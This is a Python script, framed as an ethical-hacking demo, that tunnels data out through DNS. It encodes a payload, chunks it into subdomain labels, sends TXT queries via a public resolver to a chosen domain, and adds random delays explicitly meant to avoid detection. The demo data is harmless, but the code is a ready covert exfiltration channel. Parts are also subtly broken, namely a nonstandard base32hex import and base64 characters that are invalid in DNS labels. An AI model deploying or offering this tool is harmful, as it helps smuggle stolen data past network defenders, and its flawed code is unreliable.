import base64
import base32hex
import dns.resolver
import dns.query
import dns.message
import random
import string
import time
import logging

# Setup logging to a file for reporting/demo purposes
logging.basicConfig(filename='dns_tunneling.log', level=logging.INFO,
                    format='%(asctime)s - %(message)s')

# Helper function to generate a random domain name to avoid blacklists during testing
def generate_random_subdomain(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Function to encode data using a selected encoding method (base64 or base32)
def encode_data(data, encoding='base64'):
    if encoding == 'base64':
        return base64.b64encode(data.encode('utf-8')).decode('utf-8')
    elif encoding == 'base32':
        return base32hex.b32encode(data.encode('utf-8')).decode('utf-8')
    else:
        raise ValueError("Unsupported encoding method.")

# Function to split the payload into smaller chunks to avoid size issues in DNS queries
def chunk_data(data, chunk_size=32):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

# Function to send DNS query with encoded data chunk and handle response
def send_dns_query(subdomain, domain, dns_server='8.8.8.8', retries=3):
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]

    for attempt in range(retries):
        try:
            # Full domain to query
            full_domain = f"{subdomain}.{domain}"
            print(f"Sending DNS query: {full_domain}")
            logging.info(f"Sending DNS query: {full_domain}")
            
            # Create a DNS query for the encoded chunk
            query = dns.message.make_query(full_domain, dns.rdatatype.TXT)  # Using TXT records for this example
            response = dns.query.udp(query, dns_server)

            # Process response and log results
            for answer in response.answer:
                print(f"Received response: {answer}")
                logging.info(f"Received response: {answer}")
            break  # Exit loop if the query succeeds

        except Exception as e:
            print(f"Error on attempt {attempt + 1}: {e}")
            logging.error(f"Error on attempt {attempt + 1}: {e}")
            time.sleep(2)  # Wait before retrying

# Simulate DNS tunneling by sending base64-encoded or base32-encoded data via DNS queries
def dns_tunnel(payload, domain, dns_server='8.8.8.8', encoding='base64'):
    # Encode the payload using the selected encoding method
    encoded_payload = encode_data(payload, encoding)
    # Split the encoded payload into smaller chunks to fit in DNS queries
    payload_chunks = chunk_data(encoded_payload)

    # Send each chunk via DNS queries with randomized delays
    for chunk in payload_chunks:
        subdomain = f"{chunk}.{generate_random_subdomain()}"
        send_dns_query(subdomain, domain, dns_server)

        # Randomized delay to avoid detection (between 1 and 5 seconds)
        delay = random.uniform(1, 5)
        print(f"Sleeping for {delay:.2f} seconds to avoid detection...")
        time.sleep(delay)

if __name__ == '__main__':
    # Payload to tunnel - simulate transmission of harmless log or message
    payload = "This is an enhanced demo of DNS tunneling using base64/base32 encoding. Ethical hacking demonstration."

    # Select domain and DNS server (Google Public DNS for testing)
    domain = "example.com"
    dns_server = "8.8.8.8"  # You can change this to another DNS server if needed

    # Choose encoding method (base64 or base32)
    encoding_method = "base64"  # Change to 'base32' for alternative encoding

    # Start the enhanced DNS tunneling simulation
    dns_tunnel(payload, domain, dns_server, encoding=encoding_method)